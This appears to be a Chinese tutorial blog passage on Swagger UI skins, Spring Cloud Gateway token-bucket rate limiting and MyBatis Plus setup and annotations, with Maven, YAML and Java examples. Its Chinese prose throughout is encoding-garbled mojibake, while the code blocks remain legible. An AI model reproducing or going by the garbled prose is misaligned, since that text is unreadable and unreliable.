<p>ç›¸è¾ƒäºä¼ ç»Ÿçš„Postmanæˆ–Curlæ–¹å¼æµ‹è¯•æ¥å£ï¼Œä½¿ç”¨swaggerç®€ç›´å°±æ˜¯å‚»ç“œå¼æ“ä½œï¼Œä¸éœ€è¦é¢å¤–è¯´æ˜æ–‡æ¡£(å†™å¾—å¥½æœ¬èº«å°±æ˜¯æ–‡æ¡£)è€Œä¸”æ›´ä¸å®¹æ˜“å‡ºé”™ï¼Œåªéœ€è¦å½•å…¥æ•°æ®ç„¶åç‚¹å‡»Executeï¼Œå¦‚æœå†é…åˆè‡ªåŠ¨åŒ–æ¡†æ¶ï¼Œå¯ä»¥è¯´åŸºæœ¬å°±ä¸éœ€è¦äººä¸ºæ“ä½œäº†ã€‚</p>
<p>Swaggeræ˜¯ä¸ªä¼˜ç§€çš„å·¥å…·ï¼Œç°åœ¨å›½å†…å·²ç»æœ‰å¾ˆå¤šçš„ä¸­å°å‹äº’è”ç½‘å…¬å¸éƒ½åœ¨ä½¿ç”¨å®ƒï¼Œç›¸è¾ƒäºä¼ ç»Ÿçš„è¦å…ˆå‡ºWordæ¥å£æ–‡æ¡£å†æµ‹è¯•çš„æ–¹å¼ï¼Œæ˜¾ç„¶è¿™æ ·ä¹Ÿæ›´ç¬¦åˆç°åœ¨çš„å¿«é€Ÿè¿­ä»£å¼€å‘è¡Œæƒ…ã€‚å½“ç„¶äº†ï¼Œæé†’ä¸‹å¤§å®¶åœ¨æ­£å¼ç¯å¢ƒè¦è®°å¾—å…³é—­Swaggerï¼Œä¸€æ¥å‡ºäºå®‰å…¨è€ƒè™‘äºŒæ¥ä¹Ÿå¯ä»¥èŠ‚çœè¿è¡Œæ—¶å†…å­˜ã€‚</p>
<h2 id="æ‹“å±•ï¼šå…¶ä»–çš®è‚¤"><a href="#æ‹“å±•ï¼šå…¶ä»–çš®è‚¤" class="headerlink" title="æ‹“å±•ï¼šå…¶ä»–çš®è‚¤"></a>æ‹“å±•ï¼šå…¶ä»–çš®è‚¤</h2><p>æˆ‘ä»¬å¯ä»¥å¯¼å…¥ä¸åŒçš„åŒ…å®ç°ä¸åŒçš„çš®è‚¤å®šä¹‰ï¼š</p>
<p>1ã€é»˜è®¤çš„  <strong>è®¿é—® <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302756" alt="å›¾ç‰‡"></p>
<p>2ã€bootstrap-ui  <strong>è®¿é—® <a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼•å…¥swagger-bootstrap-uiåŒ… /doc.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302600" alt="å›¾ç‰‡"></p>
<p>3ã€Layui-ui  <strong>è®¿é—® <a href="http://localhost:8080/docs.html">http://localhost:8080/docs.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼•å…¥swagger-ui-layeråŒ… /docs.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.caspar-chen<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-ui-layer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302633" alt="å›¾ç‰‡"></p>
<p>4ã€mg-ui  <strong>è®¿é—® <a href="http://localhost:8080/document.html">http://localhost:8080/document.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼•å…¥swagger-ui-layeråŒ… /document.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zyplayer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-mg-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302672" alt="å›¾ç‰‡"></p>
<h1 id="SpringCloud"><a href="#SpringCloud" class="headerlink" title="SpringCloud"></a>SpringCloud</h1><h2 id="Gatewayé™æµ-äº†è§£"><a href="#Gatewayé™æµ-äº†è§£" class="headerlink" title="Gatewayé™æµ(äº†è§£)"></a>Gatewayé™æµ(äº†è§£)</h2><p>ç½‘å…³é™¤äº†è¯·æ±‚è·¯ç”±ã€èº«ä»½éªŒè¯ï¼Œè¿˜æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„ä½œç”¨ï¼šè¯·æ±‚é™æµã€‚å½“ç³»ç»Ÿé¢å¯¹é«˜å¹¶å‘è¯·æ±‚æ—¶ï¼Œä¸ºäº†å‡å°‘å¯¹ä¸šåŠ¡å¤„ç†æœåŠ¡çš„å‹åŠ›ï¼Œéœ€è¦åœ¨ç½‘å…³ä¸­å¯¹è¯·æ±‚é™æµï¼ŒæŒ‰ç…§ä¸€å®šçš„é€Ÿç‡æ”¾è¡Œè¯·æ±‚ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022652.png" alt="image-20200108155348648"></p>
<h3 id="ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†"><a href="#ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†" class="headerlink" title="ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†"></a>ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†</h3><p>SpringGatewayä¸­é‡‡ç”¨çš„æ˜¯ä»¤ç‰Œæ¡¶ç®—æ³•ï¼Œä»¤ç‰Œæ¡¶ç®—æ³•åŸç†ï¼š</p>
<ul>
<li>å‡†å¤‡ä¸€ä¸ªä»¤ç‰Œæ¡¶ï¼Œæœ‰å›ºå®šå®¹é‡ï¼Œä¸€èˆ¬ä¸ºæœåŠ¡å¹¶å‘ä¸Šé™</li>
<li>æŒ‰ç…§å›ºå®šé€Ÿç‡ï¼Œç”Ÿæˆä»¤ç‰Œå¹¶å­˜å…¥ä»¤ç‰Œæ¡¶ï¼Œå¦‚æœæ¡¶ä¸­ä»¤ç‰Œæ•°è¾¾åˆ°ä¸Šé™ï¼Œå°±ä¸¢å¼ƒä»¤ç‰Œã€‚</li>
<li>æ¯æ¬¡è¯·æ±‚è°ƒç”¨éœ€è¦å…ˆè·å–ä»¤ç‰Œï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œï¼Œæ‰ç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™é€‰æ‹©é€‰æ‹©ç­‰å¾…æˆ–è€…ç›´æ¥æ‹’ç»ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022653.png" alt="image-20200108161959810"></p>
<h1 id="MyBatis-Plus"><a href="#MyBatis-Plus" class="headerlink" title="MyBatis Plus"></a>MyBatis Plus</h1><p>å›½äº§çš„å¼€æºæ¡†æ¶ï¼ŒåŸºäº MyBatis</p>
<p>æ ¸å¿ƒåŠŸèƒ½å°±æ˜¯ç®€åŒ– MyBatis çš„å¼€å‘ï¼Œæé«˜æ•ˆç‡ã€‚</p>
<h3 id="MyBatis-Plus-å¿«é€Ÿä¸Šæ‰‹"><a href="#MyBatis-Plus-å¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="MyBatis Plus å¿«é€Ÿä¸Šæ‰‹"></a>MyBatis Plus å¿«é€Ÿä¸Šæ‰‹</h3><p>Spring Boot(2.3.0) + MyBatis Plusï¼ˆå›½äº§çš„å¼€æºæ¡†æ¶ï¼Œå¹¶æ²¡æœ‰æ¥å…¥åˆ° Spring å®˜æ–¹å­µåŒ–å™¨ä¸­ï¼‰</p>
<p>1ã€åˆ›å»º Maven å·¥ç¨‹</p>
<p></p>
<p>2ã€pom.xml å¼•å…¥ MyBatis Plus çš„ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1.tmp<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3ã€åˆ›å»ºå®ä½“ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4ã€åˆ›å»º Mapper æ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5ã€application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure>

<p>6ã€å¯åŠ¨ç±»éœ€è¦æ·»åŠ  @MapperScan(â€œmapperæ‰€åœ¨çš„åŒ…â€)ï¼Œå¦åˆ™æ— æ³•åŠ è½½ Mppaer beanã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.southwind.mybatisplus.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisplusApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MybatisplusApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>7ã€æµ‹è¯•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserMapperTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper mapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        mapper.selectList(<span class="literal">null</span>).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å¸¸ç”¨æ³¨è§£-1"><a href="#å¸¸ç”¨æ³¨è§£-1" class="headerlink" title="å¸¸ç”¨æ³¨è§£"></a>å¸¸ç”¨æ³¨è§£</h3><blockquote>
<p>@TableName</p>
</blockquote>
<p>æ˜ å°„æ•°æ®åº“çš„è¡¨å</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@TableId</p>
</blockquote>
<p>è®¾ç½®ä¸»é”®æ˜ å°„ï¼Œvalue æ˜ å°„ä¸»é”®å­—æ®µå</p>
<p>type è®¾ç½®ä¸»é”®ç±»å‹ï¼Œä¸»é”®çš„ç”Ÿæˆç­–ç•¥ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AUTO(<span class="number">0</span>),</span><br><span class="line">NONE(<span class="number">1</span>),</span><br><span class="line">INPUT(<span class="number">2</span>),</span><br><span class="line">ASSIGN_ID(<span class="number">3</span>),</span><br><span class="line">ASSIGN_UUID(<span class="number">4</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">ID_WORKER(<span class="number">3</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">ID_WORKER_STR(<span class="number">3</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">UUID(<span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å€¼</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>AUTO</td>
<td>æ•°æ®åº“è‡ªå¢</td>
</tr>
<tr>
<td>NONE</td>
<td>MP set ä¸»é”®ï¼Œé›ªèŠ±ç®—æ³•å®ç°,ç”Ÿæˆéšæœºid</td>
</tr>
<tr>
<td>INPUT</td>
<td>éœ€è¦å¼€å‘è€…æ‰‹åŠ¨èµ‹å€¼</td>
</tr>
<tr>
<td>ASSIGN_ID</td>
<td>MP åˆ†é… IDï¼ŒLongã€Integerã€String</td>
</tr>
<tr>
<td>ASSIGN_UUID</td>
<td>åˆ†é… UUIDï¼ŒString</td>
</tr>
</tbody></table>
<p>INPUT å¦‚æœå¼€å‘è€…æ²¡æœ‰æ‰‹åŠ¨èµ‹å€¼ï¼Œåˆ™æ•°æ®åº“é€šè¿‡è‡ªå¢çš„æ–¹å¼ç»™ä¸»é”®èµ‹å€¼ï¼Œå¦‚æœå¼€å‘è€…æ‰‹åŠ¨èµ‹å€¼ï¼Œåˆ™å­˜å…¥è¯¥å€¼ã€‚</p>
<p>AUTO é»˜è®¤å°±æ˜¯æ•°æ®åº“è‡ªå¢ï¼Œå¼€å‘è€…æ— éœ€èµ‹å€¼ã€‚æ•°æ®åº“è¡¨éœ€è¦è®¾ç½®è‡ªå¢ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚æ‰‹åŠ¨èµ‹å€¼è¿˜æ˜¯ä¼šæŒ‰æ•°æ®è‡ªå¢ã€‚</p>
<p>ASSIGN_ID MP è‡ªåŠ¨èµ‹å€¼ï¼Œé›ªèŠ±ç®—æ³•ã€‚</p>
<p>ASSIGN_UUID ä¸»é”®çš„æ•°æ®ç±»å‹å¿…é¡»æ˜¯ Stringï¼Œè‡ªåŠ¨ç”Ÿæˆ UUID è¿›è¡Œèµ‹å€¼ï¼Œç”Ÿæˆçš„éšæœºidæ˜¯stringçš„ã€‚</p>
<blockquote>
<p>@TableField</p>
</blockquote>
<p>æ˜ å°„éä¸»é”®å­—æ®µï¼Œvalue æ˜ å°„å­—æ®µå</p>
<p>exist è¡¨ç¤ºæ˜¯å¦ä¸ºæ•°æ®åº“å­—æ®µ falseï¼Œå¦‚æœå®ä½“ç±»ä¸­çš„æˆå‘˜å˜é‡åœ¨æ•°æ®åº“ä¸­æ²¡æœ‰å¯¹åº”çš„å­—æ®µï¼Œåˆ™å¯ä»¥ä½¿ç”¨ existï¼ŒVOã€DTO</p>
<p>select è¡¨ç¤ºæ˜¯å¦æŸ¥è¯¢è¯¥å­—æ®µ</p>
<p>fill è¡¨ç¤ºæ˜¯å¦è‡ªåŠ¨å¡«å……ï¼Œå°†å¯¹è±¡å­˜å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œç”± MyBatis Plus è‡ªåŠ¨ç»™æŸäº›å­—æ®µèµ‹å€¼ï¼Œcreate_timeã€update_time</p>
<p>1ã€ç»™è¡¨æ·»åŠ  create_timeã€update_time å­—æ®µ</p>
<p>2ã€å®ä½“ç±»ä¸­æ·»åŠ æˆå‘˜å˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableField;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€åˆ›å»ºè‡ªåŠ¨å¡«å……å¤„ç†å™¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.reflection.MetaObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjectHandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;createTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;updateTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;updateTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@Version</p>
</blockquote>
<p>æ ‡è®°ä¹è§‚é”ï¼Œé€šè¿‡ version å­—æ®µæ¥ä¿è¯æ•°æ®çš„å®‰å…¨æ€§ï¼Œå½“ä¿®æ”¹æ•°æ®çš„æ—¶å€™ï¼Œä¼šä»¥ version ä½œä¸ºæ¡ä»¶ï¼Œå½“æ¡ä»¶æˆç«‹çš„æ—¶å€™æ‰ä¼šä¿®æ”¹æˆåŠŸã€‚</p>
<p>version &#x3D; 2</p>
<p>çº¿ç¨‹ 1:update â€¦ set version &#x3D; 2  where version &#x3D; 1</p>
<p>çº¿ç¨‹2 ï¼šupdate â€¦ set version &#x3D; 2 where version &#x3D; 1</p>
<p>1ã€æ•°æ®åº“è¡¨æ·»åŠ  version å­—æ®µï¼Œé»˜è®¤å€¼ä¸º 1</p>
<p>2ã€å®ä½“ç±»æ·»åŠ  version æˆå‘˜å˜é‡ï¼Œå¹¶ä¸”æ·»åŠ  @Version </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€æ³¨å†Œé…ç½®ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisPlusConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OptimisticLockerInterceptor <span class="title function_">optimisticLockerInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OptimisticLockerInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@EnumValue</p>
</blockquote>
<p>1ã€é€šç”¨æšä¸¾ç±»æ³¨è§£ï¼Œå°†æ•°æ®åº“å­—æ®µæ˜ å°„æˆå®ä½“ç±»çš„æšä¸¾ç±»å‹æˆå‘˜å˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.EnumValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StatusEnum</span> &#123;</span><br><span class="line">    WORK(<span class="number">1</span>,<span class="string">&quot;ä¸Šç­&quot;</span>),</span><br><span class="line">    REST(<span class="number">0</span>,<span class="string">&quot;ä¼‘æ¯&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StatusEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@EnumValue</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.StatusEnum;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = 